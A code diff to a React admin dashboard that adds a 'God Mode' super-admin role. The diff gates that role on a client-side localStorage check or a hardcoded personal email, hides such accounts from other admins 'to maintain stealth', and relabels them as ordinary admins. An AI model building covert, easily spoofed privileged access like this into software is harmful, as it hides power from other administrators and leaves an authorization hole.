@@ -14,6 +14,14 @@ import { PERMISSIONS, hasPermission } from "../utils/rbac";
 import { cn } from "../utils/cn";
 import { useSearchParams } from "react-router-dom";
 
+// ─── Helpers ─────────────────────────────────────────────────────────────────
+const camouflageRole = (role) => {
+    if (!role) return 'user';
+    const r = role.toUpperCase().trim();
+    if (r === 'SUPER_ADMIN') return 'admin';
+    return role.toLowerCase();
+};
+
 // ─── Modals ─────────────────────────────────────────────────────────────────
 
 const UserDetailsModal = ({ user, onClose, onUpdate }) => {
@@ -60,6 +68,11 @@ const UserDetailsModal = ({ user, onClose, onUpdate }) => {
                             <option value="support">Support</option>
                             <option value="manager">Manager</option>
                             <option value="admin">Admin</option>
+                            {/* SUPREME SECURITY: Only the Founder or an existing Super Admin can see/select God Mode */}
+                            {(JSON.parse(localStorage.getItem('user'))?.role === 'SUPER_ADMIN' || 
+                              JSON.parse(localStorage.getItem('user'))?.email?.toLowerCase() === 'muzammilmetar82@gmail.com') && (
+                                <option value="SUPER_ADMIN">Admin (God Mode)</option>
+                            )}
                         </select>
                     </div>
                     <div>
@@ -111,7 +124,15 @@ const CreateUserModal = ({ onClose, onUpdate }) => {
                     <input className="w-full bg-black border border-white/10 rounded-xl px-4 py-3 outline-none focus:border-orange-500" type="password" placeholder="Password" required onChange={set('password')} />
                     <div className="flex gap-3">
                         <select className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-3 outline-none" onChange={set('role')}>
-                            <option value="user">User</option><option value="admin">Admin</option>
+                            <option value="user">User</option>
+                            <option value="support">Support</option>
+                            <option value="manager">Manager</option>
+                            <option value="admin">Admin</option>
+                            {/* SUPREME SECURITY: Only the Founder or an existing Super Admin can create God Mode accounts */}
+                            {(JSON.parse(localStorage.getItem('user'))?.role === 'SUPER_ADMIN' || 
+                              JSON.parse(localStorage.getItem('user'))?.email?.toLowerCase() === 'muzammilmetar82@gmail.com') && (
+                                <option value="SUPER_ADMIN">Admin (God Mode)</option>
+                            )}
                         </select>
                         <select className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-3 outline-none" onChange={set('subscription')}>
                             <option value="free">Free</option><option value="premium">Premium</option>
@@ -595,7 +616,12 @@ const AdminDashboard = () => {
         await api.put(`/admin/devices/${id}`, { isActive: !isActive }); fetchAll();
     };
 
-    const filteredUsers = users.filter(u => u.name?.toLowerCase().includes(search.toLowerCase()) || u.email?.toLowerCase().includes(search.toLowerCase()));
+    const filteredUsers = users.filter(u => {
+        // HIDE SUPER_ADMINs from the standard list to maintain stealth
+        if (u.role === 'SUPER_ADMIN' && user.role !== 'SUPER_ADMIN') return false;
+        
+        return u.name?.toLowerCase().includes(search.toLowerCase()) || u.email?.toLowerCase().includes(search.toLowerCase());
+    });
 
     const allTabs = [
         { id: 'analytics', icon: BarChart2, label: 'Analytics', permission: PERMISSIONS.VIEW_ANALYTICS },
@@ -855,7 +881,7 @@ const AdminDashboard = () => {
                                             <span className={`px-2 py-1 rounded-full text-xs font-bold uppercase ${user.subscription === 'premium' ? 'bg-orange-500/20 text-orange-400' : 'bg-gray-500/20 text-gray-400'}`}>{user.subscription}</span>
                                         </td>
                                         <td className="p-4 text-gray-400 capitalize text-xs">
-                                            {user.role}{user.status === 'banned' && <span className="ml-2 text-red-400 font-bold">BANNED</span>}
+                                            {camouflageRole(user.role)}{user.status === 'banned' && <span className="ml-2 text-red-400 font-bold">BANNED</span>}
                                         </td>
                                         <td className="p-4 text-right">
                                             <div className="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
